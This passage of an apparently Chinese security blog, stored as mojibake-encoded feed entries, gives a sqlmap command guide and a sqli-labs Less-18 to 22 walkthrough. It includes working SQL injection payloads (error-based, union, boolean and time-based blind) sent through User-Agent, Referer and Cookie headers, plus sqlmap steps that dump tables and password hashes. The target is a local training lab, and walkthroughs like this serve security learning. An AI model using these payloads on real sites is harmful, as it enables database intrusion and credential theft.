åªæ˜¾ç¤ºpythoné”™è¯¯ä»¥åŠä¸¥é‡çš„ä¿¡æ¯ã€‚</li><li>1 åŒæ—¶æ˜¾ç¤ºåŸºæœ¬ä¿¡æ¯å’Œè­¦å‘Šä¿¡æ¯ã€‚ï¼ˆé»˜è®¤ï¼‰</li><li>2 åŒæ—¶æ˜¾ç¤ºdebugä¿¡æ¯ã€‚</li><li>3 åŒæ—¶æ˜¾ç¤ºæ´¼å…¥çš„payload</li><li>4 åŒæ—¶æ˜¾ç¤ºHTTPè¯·æ±‚</li><li>5 åŒæ—¶æ˜¾ç¤ºHTTPå“åº”å¤´</li><li>6 åŒæ—¶æ˜¾ç¤ºHTTPå“åº”é¡µé¢ã€‚</li></ul><p>å¸¸ç”¨å‘½ä»¤ï¼š</p><pre><code class="hljs awk">-a, --all<span class="hljs-regexp">//</span>è·å–æ‰€æœ‰ä¿¡æ¯-b, --banner<span class="hljs-regexp">//</span>è·å–æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡è¯†--current-user<span class="hljs-regexp">//</span>è·å–æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰ç”¨æˆ·--current-db<span class="hljs-regexp">//</span>è·å–æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰æ•°æ®åº“--hostname<span class="hljs-regexp">//</span>è·å–æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåç§°--is-dba<span class="hljs-regexp">//</span>æ£€æµ‹DBMSå½“å‰ç”¨æˆ·æ˜¯å¦DBA--users<span class="hljs-regexp">//</span>æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·--passwords<span class="hljs-regexp">//</span>æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·å¯†ç å“ˆå¸Œ--privileges<span class="hljs-regexp">//</span>æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„æƒé™--roles<span class="hljs-regexp">//</span>æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„è§’è‰²--dbs<span class="hljs-regexp">//</span>æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ•°æ®åº“--tables<span class="hljs-regexp">//</span>æšä¸¾çš„DBMSæ•°æ®åº“ä¸­çš„è¡¨--columns<span class="hljs-regexp">//</span>æšä¸¾DBMSæ•°æ®åº“è¡¨åˆ—--schema<span class="hljs-regexp">//</span>æšä¸¾æ•°æ®åº“æ¶æ„--count<span class="hljs-regexp">//</span>æ£€ç´¢è¡¨çš„é¡¹ç›®æ•°ï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ä¸ªæ•°:sqlmap.py -u url --count -D testdb--dump<span class="hljs-regexp">//</span>è½¬å‚¨æ•°æ®åº“è¡¨é¡¹--dump-all<span class="hljs-regexp">//</span>è½¬å‚¨æ•°æ®åº“æ‰€æœ‰è¡¨é¡¹--search<span class="hljs-regexp">//</span>æœç´¢åˆ—ï¼ˆSï¼‰ï¼Œè¡¨ï¼ˆSï¼‰å’Œ/æˆ–æ•°æ®åº“åç§°ï¼ˆSï¼‰--comments<span class="hljs-regexp">//</span>è·å–DBMSæ³¨é‡Š-D DB<span class="hljs-regexp">//</span>è¦è¿›è¡Œæšä¸¾çš„æŒ‡å®šæ•°æ®åº“å-T TBL<span class="hljs-regexp">//</span>DBMSæ•°æ®åº“è¡¨æšä¸¾-C COL<span class="hljs-regexp">//</span>DBMSæ•°æ®åº“è¡¨åˆ—æšä¸¾-X EXCLUDECOL<span class="hljs-regexp">//</span>DBMSæ•°æ®åº“è¡¨ä¸è¿›è¡Œæšä¸¾-U USER<span class="hljs-regexp">//</span>ç”¨æ¥è¿›è¡Œæšä¸¾çš„æ•°æ®åº“ç”¨æˆ·--exclude-sysdbs<span class="hljs-regexp">//</span>æšä¸¾è¡¨æ—¶æ’é™¤ç³»ç»Ÿæ•°æ®åº“--start=LIMITSTART<span class="hljs-regexp">//</span>è·å–ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºæ•°æ®ä½ç½®--stop=LIMITSTOP<span class="hljs-regexp">//</span>è·å–æœ€åæŸ¥è¯¢çš„è¾“å‡ºæ•°æ®--first=FIRSTCHAR<span class="hljs-regexp">//</span>ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºå­—çš„å­—ç¬¦è·å–--last=LASTCHAR<span class="hljs-regexp">//</span>æœ€åæŸ¥è¯¢çš„è¾“å‡ºå­—å­—ç¬¦è·å–--sql-query=QUERY<span class="hljs-regexp">//</span>è¦æ‰§è¡Œçš„SQLè¯­å¥--sql-shell<span class="hljs-regexp">//</span>æç¤ºäº¤äº’å¼SQLçš„shell--sql-file=SQLFILE<span class="hljs-regexp">//</span>è¦æ‰§è¡Œçš„SQLæ–‡ä»¶</code></pre><p>æŠ€æœ¯åˆ†ç±»ï¼š</p><pre><code class="hljs excel">â€“techniqueï¼šBï¼šå¸ƒå°”ç›²æ³¨Eï¼šæŠ¥é”™Uï¼šè”åˆSï¼šå †å <span class="hljs-built_in">T</span>ï¼šæ—¶é—´Qï¼šå†…è”æŸ¥è¯¢</code></pre><h1>GETå‹</h1><h4 id="1-å…ˆæµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥"><a class="header-anchor" href="#1-å…ˆæµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥">ğŸ­</a>1.å…ˆæµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥</h4><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://localhost/Less-1/?id=1&quot;</span></code></pre><p><img src="/2020/12/01/sqlmap/1.jpg" alt="1"></p><p>çº¢æ¡†æ¡†ä¸­è¯­å¥è¡¨æ˜å­˜åœ¨æ³¨å…¥ï¼Œæœ‰æ—¶å€™ä¹Ÿå¯èƒ½ä¸å­˜åœ¨SQLæ³¨å…¥ã€‚é€ä¸ªæµ‹è¯•ä¼šæŒºéº»çƒ¦çš„å¯ä»¥æ‰¹é‡æ£€æµ‹ï¼Œå°†ç›®æ ‡urlæ•´ç†ä¸ºtxtæ–‡ä»¶ï¼Œå½“æ–‡ä»¶ä¿å­˜ä¸ºhhh.txtæ—¶ä½¿ç”¨â€œsqlmap.py-m hhh.txtâ€ï¼Œæ³¨æ„<strong>hhh.txtè·Ÿsqlmapåœ¨åŒä¸€ä¸ªç›®å½•ä¸‹</strong></p><h4 id="2-æŸ¥åº“"><a class="header-anchor" href="#2-æŸ¥åº“">ğŸ­</a>2.æŸ¥åº“</h4><pre><code class="hljs jboss-cli">python sqlmap.py -u <span class="hljs-string">&quot;http://localhost/Less-1/?id=1&quot;</span> <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span></code></pre><p>or</p><pre><code class="hljs awk">sqlmap -u [â€œurlâ€] --current-db<span class="hljs-regexp">//</span>åˆ—å‡ºå½“å‰æ•°æ®åº“</code></pre><p><code>dbs</code>è¡¨ç¤ºåˆ—å‡ºè¯´æœ‰æ•°æ®åº“ï¼Œbatchå¯ä»¥è‡ªåŠ¨é€‰æ‹©ï¼Œä¹Ÿå¯ä»¥çœç•¥ï¼Œä½†çœç•¥åå°±éœ€è¦æ‰‹åŠ¨é€‰æ‹©<img src="/2020/12/01/sqlmap/2.jpg" alt="2"></p><h4 id="3-æŸ¥è¡¨"><a class="header-anchor" href="#3-æŸ¥è¡¨">ğŸ­</a>3.æŸ¥è¡¨</h4><pre><code class="hljs brainfuck"><span class="hljs-comment">sqlmap</span> <span class="hljs-literal">-</span><span class="hljs-comment">u</span> <span class="hljs-title">[</span><span class="hljs-comment">â€œurlâ€</span><span class="hljs-title">]</span> <span class="hljs-literal">-</span><span class="hljs-comment">D</span> <span class="hljs-title">[</span><span class="hljs-comment">â€˜æ•°æ®åº“åâ€™</span><span class="hljs-title">]</span> --<span class="hljs-comment">tables</span> --<span class="hljs-comment">batch</span></code></pre><p><img src="/2020/12/01/sqlmap/3.jpg" alt="3"></p><h4 id="4-æŸ¥åˆ—"><a class="header-anchor" href="#4-æŸ¥åˆ—">ğŸ­</a>4.æŸ¥åˆ—</h4><pre><code class="hljs scss">sqlmap -u <span class="hljs-selector-attr">[â€œurlâ€]</span> -D <span class="hljs-selector-attr">[â€˜æ•°æ®åº“åâ€™]</span> -T<span class="hljs-selector-attr">[â€˜è¡¨åâ€™]</span> --<span class="hljs-attribute">columns</span> --batch</code></pre><p><img src="/2020/12/01/sqlmap/4.jpg" alt="4"></p><h4 id="5-çˆ†å€¼"><a class="header-anchor" href="#5-çˆ†å€¼">ğŸ­</a>5.çˆ†å€¼</h4><pre><code class="hljs css"><span class="hljs-selector-tag">sqlmap</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-attr">[â€œurlâ€]</span> <span class="hljs-selector-tag">-D</span> <span class="hljs-selector-attr">[â€˜æ•°æ®åº“åâ€™]</span> <span class="hljs-selector-tag">-T</span> <span class="hljs-selector-attr">[â€˜è¡¨åâ€™]</span> <span class="hljs-selector-tag">-C</span> <span class="hljs-selector-attr">[â€˜å­—æ®µå1,å­—æ®µå2,â€¦â€™]</span> <span class="hljs-selector-tag">--dump</span> <span class="hljs-selector-tag">--batch</span></code></pre><p><img src="/2020/12/01/sqlmap/5.jpg" alt="5"></p><p>å…³ä¸å…³ä¹‹é—´éœ€è¦æ¸…é™¤sqlmapç¼“å­˜ï¼š</p><pre><code class="hljs c">python sqlmap.py --purge</code></pre><h1>Postå‹</h1><p>å…ˆç”¨burp suiteæŠ“ä¸ªåŒ…ï¼Œä¿å­˜åˆ°æ–‡ä»¶é‡Œ</p><p><img src="/2020/12/01/sqlmap/6.jpg" alt="6"></p><p>æ‰§è¡Œå‘½ä»¤</p><pre><code class="hljs routeros">sqlmap.py -r <span class="hljs-string">&quot;C:\Users\32270\Desktop\hhh.txt&quot;</span> <span class="hljs-attribute">--leve</span>=5 <span class="hljs-attribute">--risk</span>=3 --dbs</code></pre><p><img src="/2020/12/01/sqlmap/7.jpg" alt="7"></p><p>æŸ¥è¡¨</p><pre><code class="hljs taggerscript">python sqlmap.py -r &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\3</span>2270<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\h</span>hh.txt &quot; -D security --tables --batch</code></pre><p><img src="/2020/12/01/sqlmap/8.jpg" alt="8"></p><p>æ¥ä¸‹å»è·Ÿgetå‹ä¸€æ ·ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labsï¼ˆå››ï¼‰</title>
    <link href="/2020/11/26/sqli-labs%E5%9B%9B/"/>
    <url>/2020/11/26/sqli-labs%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h1>Less-18</h1><p>åŸºäºé”™è¯¯çš„ç”¨æˆ·ä»£ç†ï¼Œå¤´éƒ¨POSTæ³¨å…¥.</p><p>è¡¥å……å‡ ä¸ªè¯·æ±‚å¤´ï¼š</p><blockquote><ul><li><code>Host</code><br>Hostè¯·æ±‚æŠ¥å¤´åŸŸä¸»è¦ç”¨äºæŒ‡å®šè¢«è¯·æ±‚èµ„æºçš„Internetä¸»æœºå’Œç«¯å£å·ã€‚</li><li><code>User-Agent</code><br>User-Agentè¯·æ±‚æŠ¥å¤´åŸŸå…è®¸å®¢æˆ·ç«¯å°†å®ƒçš„æ“ä½œç³»ç»Ÿã€æµè§ˆå™¨å’Œå…¶ä»–å±æ€§å‘Šè¯‰æœåŠ¡å™¨ã€‚</li><li><code>Referer</code><br>RefereråŒ…å«ä¸€ä¸ªURLï¼Œä»£è¡¨å½“å‰è®¿é—®URLçš„ä¸Šä¸€ä¸ªURLã€‚</li><li><code>Cookie</code><br>Cookieæ˜¯éå¸¸é‡è¦çš„è¯·æ±‚å¤´ï¼Œå®ƒæ˜¯ä¸€æ®µæ–‡æœ¬ï¼Œå¸¸ç”¨æ¥è¡¨ç¤ºè¯·æ±‚è€…èº«ä»½ç­‰ã€‚</li><li><code>Range</code><br>Rangeå¯ä»¥è¯·æ±‚å®ä½“çš„éƒ¨åˆ†å†…å®¹ã€‚</li><li><code>X-Forwarded-For</code><br>X-Forwarded-Forå³XXFå¤´ï¼Œå®ƒä»£è¡¨è¯·æ±‚ç«¯çš„IPï¼Œå¯ä»¥æœ‰å¤šä¸ªï¼Œä¸­é—´ä»¥é€—å·éš”å¼€ã€‚</li><li><code>Accept</code><br>Acceptè¯·æ±‚æŠ¥å¤´åŸŸç”¨äºæŒ‡å®šå®¢æˆ·ç«¯æ¥æ”¶å“ªäº›<a href="https://www.cnblogs.com/tjudzj/p/6528008.html">MIMEç±»å‹</a>çš„ä¿¡æ¯ã€‚</li><li><code>Accept-Charset</code><br>Accept-Charsetè¯·æ±‚æŠ¥å¤´åŸŸç”¨äºæŒ‡å®šå®¢æˆ·ç«¯æ¥æ”¶çš„å­—ç¬¦é›†ã€‚å¦‚æœåœ¨è¯·æ±‚æ¶ˆæ¯ä¸­æ²¡æœ‰è®¾ç½®è¿™ä¸ªåŸŸï¼Œé»˜è®¤æ˜¯ä»»ä½•å­—ç¬¦é›†éƒ½å¯ä»¥æ¥æ”¶ã€‚</li></ul></blockquote><h4 id="æŸ¥æ‰¾æ³¨å…¥ç‚¹"><a class="header-anchor" href="#æŸ¥æ‰¾æ³¨å…¥ç‚¹">ğŸ­</a>æŸ¥æ‰¾æ³¨å…¥ç‚¹</h4><p>åœ¨ç”¨æˆ·åå’Œå¯†ç æ³¨å…¥éƒ½åªå›æ˜¾æœ€åˆçš„ipåœ°å€ï¼ŒæŸ¥æ‰¾æºä»£ç </p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/1.jpg" alt="1"></p><p>æœ¬å…³å¯¹ç”¨æˆ·åå’Œå¯†ç åšäº†check_input()å¤„ç†ï¼Œæ•…æ— æ³•æ³¨å…¥ã€‚ä½†åœ¨ç”¨adminç™»å½•æˆåŠŸæ—¶å‘ç°é¡µé¢æœ‰user agent ä¿¡æ¯çŒœæµ‹å¯åœ¨å…¶æ³¨å…¥ï¼Œä½†ç”±äºè¿™é‡Œæ‰§è¡Œçš„è¯­å¥æ˜¯insert,æ‰€ä»¥ä¸èƒ½åƒä¹‹å‰ä¸€æ ·ç”¨#å°†åé¢çš„è¯­å¥ç»™æ³¨é‡Šæ‰ã€‚å½“#æ³¨é‡Šæ‰åé¢å°±æ— æ³•æ­£å¸¸æ’å…¥æ‰§è¡Œ SQLè¯­å¥ã€‚</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/2.jpg" alt="2"></p><p>æŸ¥æ‰¾æºä»£ç éªŒè¯äº†çŒœæµ‹</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/3.jpg" alt="3"></p><p>æ³¨æ„:è¿™é‡Œè¦è¾“å…¥æ­£ç¡®çš„è´¦å·å’Œå¯†ç æ‰èƒ½ç»•è¿‡è´¦å·å¯†ç åˆ¤æ–­ï¼Œè¿›å…¥å¤„ç†<code>User-Agent</code>éƒ¨åˆ†ã€‚<strong>17å…³å¯¹å¯†ç è¿›è¡Œäº†æ›´æ”¹,æ•…æ­¤å¤„è®°å¾—ç”¨æ–°å¯†ç ï¼Œæˆ–è€…åœ¨é¶åœºåˆé¡µé¢é‡ç½®ï¼Œå¦åˆ™æ— æ³•ç™»å½•</strong>ï¼Œæœ¬äººç”¨adminç™»å½•äº†åŠå¤©ç™»ä¸è¿›å»ï¼Œåæ¥æ‰ååº”è¿‡æ¥17å…³æ”¹å¯†ç äº†â€¦</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/4.jpg" alt="4"></p><h3 id="ï¼ˆä¸€ï¼‰hackbaræ’ä»¶"><a class="header-anchor" href="#ï¼ˆä¸€ï¼‰hackbaræ’ä»¶">ğŸ­</a>ï¼ˆä¸€ï¼‰hackbaræ’ä»¶:</h3><h3 id="extractvalueï¼ˆï¼‰"><a class="header-anchor" href="#extractvalueï¼ˆï¼‰">ğŸ­</a>extractvalueï¼ˆï¼‰</h3><h4 id="1-è¯•æ¢"><a class="header-anchor" href="#1-è¯•æ¢">ğŸ­</a>1.è¯•æ¢</h4><p>å…ˆè¯•å•å¼•å·</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/7.jpg" alt="7"></p><p>æŠ¥é”™ï¼Œå†é—­åˆï¼Œå›æ˜¾æ­£å¸¸</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/6.jpg" alt="6"></p><p>æŸ¥çœ‹æºä»£ç ç¡®å®šä¸ºå•å¼•å·æ³¨å…¥ã€‚</p><h4 id="2-çˆ†åº“"><a class="header-anchor" href="#2-çˆ†åº“">ğŸ­</a>2.çˆ†åº“</h4><p><code>' or extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/5.jpg" alt="5"></p><h4 id="3-çˆ†è¡¨"><a class="header-anchor" href="#3-çˆ†è¡¨">ğŸ­</a>3.çˆ†è¡¨</h4><p><code>' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from  information_schema.tables and table_schema=database()))) or '1'='1</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/8.jpg" alt="8"></p><h4 id="4-çˆ†åˆ—"><a class="header-anchor" href="#4-çˆ†åˆ—">ğŸ­</a>4.çˆ†åˆ—</h4><p><code>' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security')))  or '1'='1</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/9.jpg" alt="9"></p><h4 id="5-çˆ†å€¼"><a class="header-anchor" href="#5-çˆ†å€¼">ğŸ­</a>5.çˆ†å€¼</h4><p><code>' or extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))  or'1'='1 </code><img src="/2020/11/26/sqli-labs%E5%9B%9B/10.jpg" alt="10"></p><p>é‡åˆ°ä¹‹å‰çš„è€é—®é¢˜æ•°æ®æ˜¾ç¤ºä¸å…¨ï¼Œå¯ç”¨limit0,1;æ¥éå†æˆ–è€…ä½¿ç”¨not in()ï¼š</p><p><code>' or extractvalue(1,concat(0x7e,(select  group_concat(username,0x3a,password) from users where username not in  ('Dumb','Angelinal')))) or ' </code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/11.jpg" alt="11"></p><p>ä¸è¿‡è¿™ç§æ–¹æ³•ä¹Ÿå¾ˆéº»çƒ¦ã€‚</p><p>updatexml()ç±»ä¼¼ã€‚</p><h3 id="floor"><a class="header-anchor" href="#floor">ğŸ­</a>floor():</h3><p><code>' and (select 1 from (select  count(*),concat_ws('-',(select user()),floor(rand()*2))as a from  information_schema.tables group by a) b)  and '</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/12.jpg" alt="12"></p><p>ä¹Ÿå¯ä½¿ç”¨æ—¶é—´ç›²æ³¨ã€‚</p><h3 id="äºŒ-HTTP-Header-Live"><a class="header-anchor" href="#äºŒ-HTTP-Header-Live">ğŸ­</a>(äºŒ)HTTP Header Live</h3><p>HTTP Header Liveæ˜¯Firefoxä¸­çš„æ’ä»¶ï¼Œå¯åœ¨å…¶ä¸­å¯¹user-agent è¿›è¡Œä¿®æ”¹ã€‚</p><h3 id="13"><a class="header-anchor" href="#13">ğŸ­</a><img src="/2020/11/26/sqli-labs%E5%9B%9B/13.jpg" alt="13"></h3><h3 id="ï¼ˆä¸‰ï¼‰Live-HTTP-headers"><a class="header-anchor" href="#ï¼ˆä¸‰ï¼‰Live-HTTP-headers">ğŸ­</a>ï¼ˆä¸‰ï¼‰Live HTTP headers</h3><p>Live HTTP headersä¹Ÿæ˜¯Firefoxé‡Œçš„æ’ä»¶ï¼Œä½†æ˜¯éœ€è¦å®‰è£…ä½ç‰ˆæœ¬ç«ç‹ï¼Œæµ‹è¯•å®‰è£…çš„æ˜¯45.0ç‰ˆæœ¬æµè§ˆå™¨ã€‚è¿™ç¯‡åšå®¢æœ‰è¯¦ç»†æ•™ç¨‹ï¼š<a href="https://blog.csdn.net/qq_22146195/article/details/103537148">ç«ç‹æµè§ˆå™¨å®‰è£…Live HTTP headersæ­¥éª¤è®°å½•</a></p><h3 id="å››-Burp-Suite"><a class="header-anchor" href="#å››-Burp-Suite">ğŸ­</a>(å››)Burp Suite</h3><p>Burp Suite æ˜¯ç”¨äºæ”»å‡»web åº”ç”¨ç¨‹åºçš„é›†æˆå¹³å°ï¼ŒåŒ…å«è®¸å¤šå·¥å…·,ä¸”è¿™äº›å·¥å…·è®¾è®¡äº†è®¸å¤šæ¥å£ï¼Œä»¥åŠ å¿«æ”»å‡»åº”ç”¨ç¨‹åºçš„è¿‡ç¨‹ã€‚æ‰€æœ‰å·¥å…·éƒ½å…±äº«ä¸€ä¸ªè¯·æ±‚ï¼Œå¹¶èƒ½å¤„ç†å¯¹åº”çš„HTTP æ¶ˆæ¯ã€æŒä¹…æ€§ã€è®¤è¯ã€ä»£ç†ã€æ—¥å¿—ã€è­¦æŠ¥ã€‚<strong>å®‰è£…burp suiteéœ€è¦javaç¯å¢ƒ</strong></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/14.jpg" alt="14"></p><p>ç±»ä¼¼å·¥å…·è¿˜æœ‰å¾ˆå¤šä¸ä¸€ä¸€åˆ—ä¸¾ã€‚</p><h1>Less-19</h1><p>åŸºäºå¤´éƒ¨çš„Referer POSTæŠ¥é”™æ³¨å…¥</p><p>æˆåŠŸç™»é™†åä¼šæ˜¾ç¤ºrefereråœ°å€,ç”¨æˆ·åä¸18å…³ä¸€æ ·ç”¨å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œæ•…åœ¨refereræ³¨å…¥ã€‚ä¸18å…³ç±»ä¼¼ã€‚</p><p>ä»å¯ç”¨HTTP Header Liveï¼š</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/15.jpg" alt="15"></p><p>Burp Suiteï¼š</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/16.jpg" alt="16"></p><h1>Less-20</h1><p>åŸºäºé”™è¯¯çš„cookieå¤´éƒ¨POSTæ³¨å…¥</p><p>ä»æºä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°cookieä»usernameè·å¾—å€¼ä¹‹åï¼Œå½“å†æ¬¡åˆ·æ–°æ—¶ä¼šä»cookieä¸­è·å–username,ç„¶åè¿›è¡ŒæŸ¥è¯¢ã€‚</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/18.jpg" alt="18"></p><p>å› ä¸ºæ­¤å…³ä¸ºpostæ³¨å…¥ï¼Œå¯ä½¿ç”¨unionè”åˆè¯­å¥ï¼ŒæŠ¥é”™è¯­å¥ã€‚</p><h2 id="æ³•ä¸€ï¼šunionè”åˆè¯­å¥"><a class="header-anchor" href="#æ³•ä¸€ï¼šunionè”åˆè¯­å¥">ğŸ­</a>æ³•ä¸€ï¼šunionè”åˆè¯­å¥</h2><h4 id="1-è¯•æ¢-v2"><a class="header-anchor" href="#1-è¯•æ¢-v2">ğŸ­</a>1.è¯•æ¢</h4><p>ä»ä¸Šå›¾æºä»£ç ä¸­å¯ä»¥çœ‹å‡ºæœ¬å…³ä¸ºå•å¼•å·æ³¨å…¥ï¼Œä¹Ÿå¯ä»¥è¯•æ¢ä¸€ä¸‹ï¼š</p><p>å•å¼•å·æŠ¥é”™</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/19.jpg" alt="19"></p><p>æ³¨é‡Šæ‰å›æ˜¾æ­£å¸¸</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/20.jpg" alt="20"></p><h4 id="2-åˆ¤æ–­å­—æ®µæ•°ä¸å›æ˜¾å­—æ®µ"><a class="header-anchor" href="#2-åˆ¤æ–­å­—æ®µæ•°ä¸å›æ˜¾å­—æ®µ">ğŸ­</a>2.åˆ¤æ–­å­—æ®µæ•°ä¸å›æ˜¾å­—æ®µ</h4><p>ä½¿ç”¨burp suiteæŠ“ä¸ªåŒ…ï¼š</p><p><code>uname=admin' order by 4 -- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/21.jpg" alt="21"></p><p>4æŠ¥é”™ï¼Œ3å›æ˜¾æ­£å¸¸ã€‚å…¶å®å’Œç¬¬ä¸€å…³å¦‚å‡ºä¸€è¾™ã€‚</p><p><code>uname=1' union select 1,2,3 -- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/22.jpg" alt="22"></p><p>ä¹‹åå°±æ˜¯æŸ¥åº“ï¼ŒæŸ¥è¡¨ï¼ŒæŸ¥åˆ—ï¼ŒæŸ¥å€¼â€¦ä¸å†èµ˜è¿°ã€‚</p><h2 id="æ³•äºŒï¼šfloor"><a class="header-anchor" href="#æ³•äºŒï¼šfloor">ğŸ­</a>æ³•äºŒï¼šfloor()</h2><p><code>uname=1' or (select 1 from (select 1,count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)-- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/23.jpg" alt="23"></p><h2 id="æ³•ä¸‰ï¼šupdatexml-æ³¨å…¥ï¼Œextractvalue-æ³¨å…¥"><a class="header-anchor" href="#æ³•ä¸‰ï¼šupdatexml-æ³¨å…¥ï¼Œextractvalue-æ³¨å…¥">ğŸ­</a>æ³•ä¸‰ï¼šupdatexml()æ³¨å…¥ï¼Œextractvalue()æ³¨å…¥</h2><p><code>uname=1' or updatexml(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e),0)-- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/24.jpg" alt="24"></p><h2 id="æ³•å››ï¼šå¸ƒå°”ç›²æ³¨"><a class="header-anchor" href="#æ³•å››ï¼šå¸ƒå°”ç›²æ³¨">ğŸ­</a>æ³•å››ï¼šå¸ƒå°”ç›²æ³¨</h2><p><code>uname=admin' and left((select database()),8)='security'-- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/27.jpg" alt="27"></p><p>æŠ¥é”™æ—¶é¡µé¢ï¼š</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/26.jpg" alt="26"></p><h2 id="æ³•äº”ï¼šå»¶æ—¶æ³¨å…¥"><a class="header-anchor" href="#æ³•äº”ï¼šå»¶æ—¶æ³¨å…¥">ğŸ­</a>æ³•äº”ï¼šå»¶æ—¶æ³¨å…¥</h2><p><code>uname=admin' and if(length(database())=8,1,sleep(5))-- #</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/28.jpg" alt="28"></p><p>ç”¨burp suite æŠ“åŒ…æŠ¥é”™ä¼šä¸€ç›´å»¶æ—¶ï¼Œhackbaræ­£å¸¸å»¶æ—¶ï¼ŒæŠ¥é”™é¡µé¢å¦‚ä¸‹ï¼š</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/29.jpg" alt="29"></p><h1>Less-21</h1><p>åŸºäºbase64ç¼–ç å•å¼•å·å’Œæ‹¬å·çš„Cookieæ³¨å…¥</p><p>æœ¬å…³å’ŒLess-20ç›¸ä¼¼ï¼Œcookieä»usernameè·å¾—å€¼ä¹‹åï¼Œå†æ¬¡åˆ·æ–°æ—¶ä¼šä»cookieä¸­è·å–username,å†è¿›è¡ŒæŸ¥è¯¢,åªæ˜¯cookieçš„unameå€¼éœ€ç»è¿‡base64ç¼–ç ã€‚</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/32.jpg" alt="32"></p><p>æ¨èä¸€ä¸ªç¼–ç å™¨<a href="https://base64.us/">Base64 åœ¨çº¿ç¼–ç è§£ç </a>ï¼Œadminçš„ç¼–ç ä¸ºYWRtaW4=</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/31.jpg" alt="31"></p><p>å•å¼•å·æŠ¥é”™ï¼š</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/33.jpg" alt="33"></p><p><code>')</code>ä¹ŸæŠ¥é”™ï¼Œç”¨#æ³¨é‡Šåå›æ˜¾æ­£å¸¸ã€‚å…¶ä½™æ“ä½œä¸20å…³ç›¸åŒï¼Œå°†å‘½ä»¤ç¼–ç å³å¯ã€‚</p><h1>Less-22</h1><p>ç™»å½•æˆåŠŸåæ˜¾ç¤ºçš„æ˜¯21å…³çš„å›¾ç‰‡ï¼Œåº”è¯¥æ˜¯ä½œè€…å¼„é”™äº†ã€‚</p><p>åŒå¼•å·æŠ¥é”™</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/34.jpg" alt="34"></p><p>æ³¨é‡Šåå›æ˜¾æ­£å¸¸</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/35.jpg" alt="35"></p><p>æ¥ä¸‹å»å°±è·Ÿ21ç±»ä¼¼ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs(ä¸‰)</title>
    <link href="/2020/11/22/sqli-labs%E4%B8%89/"/>
    <url>/2020/11/22/sqli-labs%E4%B8%89/</url>
    
